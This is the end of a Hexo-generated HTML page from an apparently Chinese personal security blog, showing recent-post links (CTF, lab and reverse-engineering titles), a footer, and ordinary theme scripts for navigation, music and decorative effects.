href="/posts/490db2dd/" title="ycb"><img src="/image/38.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="ycb"/></a><div class="content"><a class="title" href="/posts/490db2dd/" title="ycb">ycb</a><time datetime="2025-10-13T12:47:37.000Z" title="发表于 2025-10-13 20:47:37">2025-10-13</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/6870a2f8/" title="kctf"><img src="/image/31.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="kctf"/></a><div class="content"><a class="title" href="/posts/6870a2f8/" title="kctf">kctf</a><time datetime="2025-10-07T02:10:50.000Z" title="发表于 2025-10-07 10:10:50">2025-10-07</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/1f961f21/" title="Lazysysadmin靶场"><img src="/image/27.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Lazysysadmin靶场"/></a><div class="content"><a class="title" href="/posts/1f961f21/" title="Lazysysadmin靶场">Lazysysadmin靶场</a><time datetime="2025-10-06T06:59:44.000Z" title="发表于 2025-10-06 14:59:44">2025-10-06</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/9721c6fb/" title="我不要当脚本小子啊(っ °Д °;)っ"><img src="/image/28.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="我不要当脚本小子啊(っ °Д °;)っ"/></a><div class="content"><a class="title" href="/posts/9721c6fb/" title="我不要当脚本小子啊(っ °Д °;)っ">我不要当脚本小子啊(っ °Д °;)っ</a><time datetime="2025-09-28T11:25:46.000Z" title="发表于 2025-09-28 19:25:46">2025-09-28</time></div></div></div></div></div></div></main><footer id="footer"><div class="footer-other"><div class="footer-copyright"><span class="copyright">&copy;2025 By 爱学习居士</span><span class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo 7.3.0</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly 5.4.0-b1</a></span></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><div class="js-pjax"></div><script async src="/js/title.js"></script><script defer src="/live2d-widget-master/autoload.js"></script><script src="/js/sakura.js"></script><canvas class="fireworks" mobile="false"></canvas><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/fireworks.min.js"></script><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/activate-power-mode.min.js"></script><script>POWERMODE.colorful = true;
+POWERMODE.shake = true;
+POWERMODE.mobile = false;
+document.body.addEventListener('input', POWERMODE);
+</script><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.js"></script><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/metingjs/dist/Meting.min.js"></script><script>(() => {
+  const destroyAplayer = () => {
+    if (window.aplayers) {
+      for (let i = 0; i < window.aplayers.length; i++) {
+        if (!window.aplayers[i].options.fixed) {
+          window.aplayers[i].destroy()
+        }
+      }
+    }
+  }
+
+  const runMetingJS = () => {
+    typeof loadMeting === 'function' && document.getElementsByClassName('aplayer').length && loadMeting()
+  }
+
+  btf.addGlobalFn('pjaxSend', destroyAplayer, 'destroyAplayer')
+  btf.addGlobalFn('pjaxComplete', loadMeting, 'runMetingJS')
+})()</script><script src="https://cdn.jsdelivr.net/npm/pjax/pjax.min.js"></script><script>(() => {
+  const pjaxSelectors = ["head > title","#config-diff","#body-wrap","#rightside-config-hide","#rightside-config-show",".js-pjax"]
+
+  window.pjax = new Pjax({
+    elements: 'a:not([target="_blank"])',
+    selectors: pjaxSelectors,
+    cacheBust: false,
+    analytics: false,
+    scrollRestoration: false
+  })
+
+  const triggerPjaxFn = (val) => {
+    if (!val) return
+    Object.values(val).forEach(fn => fn())
+  }
+
+  document.addEventListener('pjax:send', () => {
+    // removeEventListener
+    btf.removeGlobalFnEvent('pjaxSendOnce')
+    btf.removeGlobalFnEvent('themeChange')
+
+    // reset readmode
+    const $bodyClassList = document.body.classList
+    if ($bodyClassList.contains('read-mode')) $bodyClassList.remove('read-mode')
+
+    triggerPjaxFn(window.globalFn.pjaxSend)
+  })
+
+  document.addEventListener('pjax:complete', () => {
+    btf.removeGlobalFnEvent('pjaxCompleteOnce')
+    document.querySelectorAll('script[data-pjax]').forEach(item => {
+      const newScript = document.createElement('script')
+      const content = item.text || item.textContent || item.innerHTML || ""
+      Array.from(item.attributes).forEach(attr => newScript.setAttribute(attr.name, attr.value))
+      newScript.appendChild(document.createTextNode(content))
+      item.parentNode.replaceChild(newScript, item)
+    })
+
+    triggerPjaxFn(window.globalFn.pjaxComplete)
+  })
+
+  document.addEventListener('pjax:error', e => {
+    if (e.request.status === 404) {
+      const usePjax = true
+      false
+        ? (usePjax ? pjax.loadUrl('/404.html') : window.location.href = '/404.html')
+        : window.location.href = e.request.responseURL
+    }
+  })
+})()</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div><!-- hexo injector body_end start --> <script data-pjax>if(document.getElementById('recent-posts') && (location.pathname ==='/'|| '/' ==='all')){
+    var parent = document.getElementById('recent-posts');
+    var child = '<div class="recent-post-item" style="width:100%;height: auto"><div id="catalog_magnet"><div class="magnet_item"><a class="magnet_link" href="https://qinfuu.github.io/categories/从0开始的re世界/"><div class="magnet_link_context" style=""><span style="font-weight:500;flex:1">📚 从0开始的re世界 (3)</span><span style="padding:0px 4px;border-radius: 8px;"><i class="fas fa-arrow-circle-right"></i></span></div></a></div><div class="magnet_item"><a class="magnet_link" href="https://qinfuu.github.io/categories/靶场/"><div class="magnet_link_context" style=""><span style="font-weight:500;flex:1">🔑 一些些瞎写的靶场 (3)</span><span style="padding:0px 4px;border-radius: 8px;"><i class="fas fa-arrow-circle-right"></i></span></div></a></div><div class="magnet_item"><a class="magnet_link" href="https://qinfuu.github.io/categories/安卓/"><div class="magnet_link_context" style=""><span style="font-weight:500;flex:1">📱 机佬的生活 (1)</span><span style="padding:0px 4px;border-radius: 8px;"><i class="fas fa-arrow-circle-right"></i></span></div></a></div><div class="magnet_item"><a class="magnet_link" href="https://qinfuu.github.io/categories/复现/"><div class="magnet_link_context" style=""><span style="font-weight:500;flex:1">😨 ？成神之路 (5)</span><span style="padding:0px 4px;border-radius: 8px;"><i class="fas fa-arrow-circle-right"></i></span></div></a></div><div class="magnet_item"><a class="magnet_link" href="https://qinfuu.github.io/categories/编程/"><div class="magnet_link_context" style=""><span style="font-weight:500;flex:1">📒 脚本小子是这样的 (1)</span><span style="padding:0px 4px;border-radius: 8px;"><i class="fas fa-arrow-circle-right"></i></span></div></a></div><div class="magnet_item" style="visibility: hidden"></div><a class="magnet_link_more"  href="https://qinfuu.github.io/categories" style="flex:1;text-align: center;margin-bottom: 10px;">查看更多...</a></div></div>';
+    console.log('已挂载magnet')
+    parent.insertAdjacentHTML("afterbegin",child)}
+     </script><style>#catalog_magnet{flex-wrap: wrap;display: flex;width:100%;justify-content:space-between;padding: 10px 10px 0 10px;align-content: flex-start;}.magnet_item{flex-basis: calc(50% - 5px);background: #f2f2f2;margin-bottom: 10px;border-radius: 8px;transition: all 0.2s ease-in-out;}.magnet_item:hover{background: #b30070}.magnet_link_more{color:#555}.magnet_link{color:black}.magnet_link:hover{color:white}@media screen and (max-width: 600px) {.magnet_item {flex-basis: 100%;}}.magnet_link_context{display:flex;padding: 10px;font-size:16px;transition: all 0.2s ease-in-out;}.magnet_link_context:hover{padding: 10px 20px;}</style>
+    <style></style><script data-pjax>
+  function butterfly_swiper_injector_config(){
+    var parent_div_git = document.getElementById('recent-posts');
+    var item_html = '<div class="recent-post-item" style="height: auto;width: 100%"><div class="blog-slider swiper-container-fade swiper-container-horizontal" id="swiper_container"><div class="blog-slider__wrp swiper-wrapper" style="transition-duration: 0ms;"><div class="blog-slider__item swiper-slide" style="width: 750px; opacity: 1; transform: translate3d(0px, 0px, 0px); transition-duration: 0ms;"><a class="blog-slider__img" onclick="pjax.loadUrl(&quot;posts/a1786872/&quot;);" href="javascript:void(0);" alt=""><img width="48" height="48" src="/image/2.jpg" alt="" onerror="this.src=https://unpkg.zhimg.com/akilar-candyassets/image/loading.gif; this.onerror = null;"/></a><div class="blog-slider__content"><span class="blog-slider__code">2025-07-08</span><a class="blog-slider__title" onclick="pjax.loadUrl(&quot;posts/a1786872/&quot;);" href="javascript:void(0);" alt="">游戏游戏游戏O(∩_∩)O~~</a><div class="blog-slider__text">unity逆向，列了两种出包方式还有一个I2CppDumper工具</div><a class="blog-slider__button" onclick="pjax.loadUrl(&quot;posts/a1786872/&quot;);" href="javascript:void(0);" alt="">详情       </a></div></div><div class="blog-slider__item swiper-slide" style="width: 750px; opacity: 1; transform: translate3d(0px, 0px, 0px); transition-duration: 0ms;"><a class="blog-slider__img" onclick="pjax.loadUrl(&quot;posts/9721c6fb/&quot;);" href="javascript:void(0);" alt=""><img width="48" height="48" src="/image/28.jpg" alt="" onerror="this.src=https://unpkg.zhimg.com/akilar-candyassets/image/loading.gif; this.onerror = null;"/></a><div class="blog-slider__content"><span class="blog-slider__code">2025-09-28</span><a class="blog-slider__title" onclick="pjax.loadUrl(&quot;posts/9721c6fb/&quot;);" href="javascript:void(0);" alt="">我不要当脚本小子啊(っ °Д °;)っ</a><div class="blog-slider__text">呃...我不会弃更的</div><a class="blog-slider__button" onclick="pjax.loadUrl(&quot;posts/9721c6fb/&quot;);" href="javascript:void(0);" alt="">详情       </a></div></div><div class="blog-slider__item swiper-slide" style="width: 750px; opacity: 1; transform: translate3d(0px, 0px, 0px); transition-duration: 0ms;"><a class="blog-slider__img" onclick="pjax.loadUrl(&quot;posts/2ced0bad/&quot;);" href="javascript:void(0);" alt=""><img width="48" height="48" src="/image/26.jpg" alt="" onerror="this.src=https://unpkg.zhimg.com/akilar-candyassets/image/loading.gif; this.onerror = null;"/></a><div class="blog-slider__content"><span class="blog-slider__code">2025-09-25</span><a class="blog-slider__title" onclick="pjax.loadUrl(&quot;posts/2ced0bad/&quot;);" href="javascript:void(0);" alt="">怎么老是你flutter</a><div class="blog-slider__text">灰产app重灾区</div><a class="blog-slider__button" onclick="pjax.loadUrl(&quot;posts/2ced0bad/&quot;);" href="javascript:void(0);" alt="">详情       </a></div></div></div><div class="blog-slider__pagination swiper-pagination-clickable swiper-pagination-bullets"></div></div></div>';
+    console.log('已挂载butterfly_swiper')
+    parent_div_git.insertAdjacentHTML("afterbegin",item_html)
+    }
+  var elist = 'undefined'.split(',');
+  var cpage = location.pathname;
+  var epage = 'all';
+  var flag = 0;
+
+  for (var i=0;i<elist.length;i++){
+    if (cpage.includes(elist[i])){
+      flag++;
+    }
+  }
+
+  if ((epage ==='all')&&(flag == 0)){
+    butterfly_swiper_injector_config();
+  }
+  else if (epage === cpage){
+    butterfly_swiper_injector_config();
+  }
+  </script><script defer src="https://npm.elemecdn.com/hexo-butterfly-swiper/lib/swiper.min.js"></script><script defer data-pjax src="https://npm.elemecdn.com/hexo-butterfly-swiper/lib/swiper_init.js"></script><!-- hexo injector body_end end --></body></html>
